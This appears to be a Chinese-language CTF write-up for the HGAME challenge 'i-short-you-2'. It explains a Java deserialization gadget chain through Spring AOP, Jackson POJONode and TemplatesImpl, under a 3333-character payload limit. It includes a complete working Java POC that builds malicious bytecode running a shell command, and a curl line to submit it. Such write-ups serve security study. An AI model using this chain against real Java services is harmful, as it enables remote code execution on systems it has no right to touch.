# i-short-you-2

## 题目简述

题目直接对用户提交的 Base64 解码并调用 Java `ObjectInputStream.readObject()`，但在解码前要求 `payload.length() <= 3333`，同时预期环境不能向外建立普通网络连接。目标是在这个长度内构造稳定的本地 gadget chain，并把命令输出带回 HTTP 响应。

漏洞入口等价于：

```java
public Object hack(@RequestParam String payload) {
    if (payload.length() > 3333) {
        return "hacker!!!";
    }

    byte[] bytes = Base64.getDecoder().decode(payload);
    try {
        new ObjectInputStream(new ByteArrayInputStream(bytes)).readObject();
    } catch (Exception e) {
        e.printStackTrace();
        return e;
    }
    return "success";
}
```

因此可利用点有两个：服务端没有任何反序列化白名单；异常对象会作为响应返回，命令输出可以主动放进异常消息，不必依赖反弹 shell。

## 解题过程

### 设计短且可回显的调用链

官方预期链由以下几部分组成：

```text
HashMap.readObject()
  -> HotSwappableTargetSource.equals()
  -> XString.equals()
  -> POJONode.toString()
  -> Jackson 序列化 Templates 动态代理
  -> JdkDynamicAopProxy.invoke()
  -> TemplatesImpl.getOutputProperties()/newTransformer()
  -> 加载并实例化恶意 AbstractTranslet 字节码
```

构造时把 `POJONode` 与 `XString` 分别包进两个哈希相同的 `HotSwappableTargetSource`，再直接伪造 `HashMap` 的内部节点。反序列化重建 Map 时会发生键比较，最终触发 `POJONode.toString()`。`POJONode` 对内部对象做 Jackson 序列化，而内部对象是 Spring `JdkDynamicAopProxy` 创建的 `Templates` 代理；getter 调用被转发到 `TemplatesImpl`，从 `_bytecodes` 加载 Javassist 生成的类。

恶意类的构造函数执行 `cat /hgame_flag_wonderful`，再把标准输出写进主动抛出的异常。题目控制器会返回捕获到的异常，所以 flag 最终出现在 JSON 响应的 `message` 字段中。

### 完整载荷生成代码

下面是按官方 PDF 逐行整理后的 POC。`BaseJsonNode.writeReplace()` 会在序列化阶段替换节点，破坏预期链，因此首先用 Javassist 删除该方法。`proxiedInterfaces` 被置空、类名和 `_name` 都保持很短，以将最终 Base64 压到 3236 字符，低于 3333 的限制。

```java
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;

public class POC {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();

        CtClass baseJsonNode =
            pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace =
            baseJsonNode.getDeclaredMethod("writeReplace");
        baseJsonNode.removeMethod(writeReplace);
        baseJsonNode.toClass();

        CtClass payloadClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        payloadClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(
            new CtClass[]{}, payloadClass
        );
        constructor.setBody(
            "throw new Exception(new java.util.Scanner(" +
            "Runtime.getRuntime().exec(\"cat /hgame_flag_wonderful\")" +
            ".getInputStream()).next());"
        );
        payloadClass.addConstructor(constructor);
        byte[] bytecode = payloadClass.toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(
            templatesImpl,
            "_bytecodes",
            new byte[][]{bytecode}
        );
        setFieldValue(templatesImpl, "_name", "1ue");
        setFieldValue(templatesImpl, "_tfactory", null);

        Class<?> proxyClass = Class.forName(
            "org.springframework.aop.framework.JdkDynamicAopProxy"
        );
        Constructor<?> proxyConstructor =
            proxyClass.getDeclaredConstructor(AdvisedSupport.class);
        proxyConstructor.setAccessible(true);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTargetSource(
            new HotSwappableTargetSource(templatesImpl)
        );
        InvocationHandler handler = (InvocationHandler)
            proxyConstructor.newInstance(advisedSupport);
        setFieldValue(handler, "proxiedInterfaces", null);

        Templates proxyObject = (Templates) Proxy.newProxyInstance(
            proxyClass.getClassLoader(),
            new Class[]{Templates.class},
            handler
        );
        POJONode jsonNode = new POJONode(proxyObject);

        HotSwappableTargetSource first =
            new HotSwappableTargetSource(jsonNode);
        HotSwappableTargetSource second =
            new HotSwappableTargetSource(new XString(null));
        HashMap<Object, Object> exploit = makeMap(first, second);

        ByteArrayOutputStream output = new ByteArrayOutputStream();
        ObjectOutputStream objectOutput = new ObjectOutputStream(output);
        objectOutput.writeObject(exploit);
        objectOutput.close();

        String payload = Base64.getEncoder()
            .encodeToString(output.toByteArray());
        System.out.println(payload);
        System.out.println("length: " + payload.length());

        // 仅用于本地验证；生成提交载荷时可注释。
        new ObjectInputStream(
            new ByteArrayInputStream(output.toByteArray())
        ).readObject();
    }

    private static void setFieldValue(
        Object object,
        String fieldName,
        Object value
    ) throws Exception {
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static HashMap<Object, Object> makeMap(
        Object first,
        Object second
    ) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        setFieldValue(map, "size", 2);

        Class<?> nodeClass;
        try {
            nodeClass = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException exception) {
            nodeClass = Class.forName("java.util.HashMap$Entry");
        }

        Constructor<?> nodeConstructor =
            nodeClass.getDeclaredConstructor(
                int.class,
                Object.class,
                Object.class,
                nodeClass
            );
        nodeConstructor.setAccessible(true);

        Object table = Array.newInstance(nodeClass, 2);
        Array.set(
            table,
            0,
            nodeConstructor.newInstance(0, first, first, null)
        );
        Array.set(
            table,
            1,
            nodeConstructor.newInstance(0, second, second, null)
        );
        setFieldValue(map, "table", table);
        return map;
    }
}
```

这段代码依赖题目对应版本的 Jackson、Spring AOP 与 Javassist，并使用 JDK 内部 Xalan 类及私有字段反射。应优先在与靶场相同的 JDK 8/依赖组合中生成；换用现代 JDK 时，模块封装、字段布局和依赖版本变化都可能使链失效或长度发生变化。

### 提交并读取异常回显

运行 POC 后先确认打印长度不超过 3333，再把 Base64 作为 `payload` 参数提交。必须对 Base64 做 URL 编码：

```bash
curl -G 'http://<target>/backdoor' \
  --data-urlencode 'payload=<base64-payload>'
```

恶意构造函数主动抛出的异常一路进入控制器响应，在返回 JSON 的 `message` 与 `localizedMessage` 中可以看到：

```text
hgame{630e944081ca845796db3f50885bcec04696e295}
```

官方 PDF 给出了 3236 字符的完整 POC 与异常回显截图；[参赛者复盘](https://zer0peach.github.io/2024/02/24/HGAME-week4/)进一步说明了 3333 字符入口限制、无普通出网条件、链条压缩点及其他非预期思路，正文已经概括必要信息，无需依赖外链理解解法。

## 方法总结

- “不出网”并不妨碍本地 Java gadget chain；让命令输出进入异常消息，可以利用控制器返回异常的行为实现直接回显。
- 删除 `BaseJsonNode.writeReplace()` 是保留 `POJONode` 反序列化形态的前提，否则链会在序列化阶段被替换。
- `HashMap` 内部节点可以被反射直接构造，从而避免生成 payload 时提前调用危险的 `hashCode()`/`equals()`，反序列化时再触发目标链。
- 压缩序列化载荷要同时考虑对象字段、代理接口、类名、命令文本和 Base64 膨胀；本题最终值 3236 必须与 3333 限制直接比较。
- 这类链高度依赖 JDK 与第三方库版本。复现时应锁定题目依赖，而不能把某个环境中可生成的载荷直接视为跨版本通用。
